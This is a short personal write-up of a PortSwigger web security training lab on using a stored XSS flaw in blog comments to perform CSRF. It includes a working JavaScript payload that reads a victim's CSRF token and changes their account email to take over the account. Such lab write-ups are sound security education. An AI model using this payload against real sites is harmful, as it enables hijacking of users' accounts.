# Practitioner Lab 76: Exploiting XSS to perform CSRF

---

This lab contains a [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a [CSRF attack](https://portswigger.net/web-security/csrf) and change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

![Untitled](Practitioner%20Lab%2076%20Exploiting%20XSS%20to%20perform%20CSRF%2084b2901ae7d741d09f5cb229c7c20f2b/Untitled.png)

First thing I noted was that email can be changed without needing a password. 

This means that I can use XSS to change this email to something I control and then do a password reset.

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=me@me.com')
};
</script>
```

![Untitled](Practitioner%20Lab%2076%20Exploiting%20XSS%20to%20perform%20CSRF%2084b2901ae7d741d09f5cb229c7c20f2b/Untitled%201.png)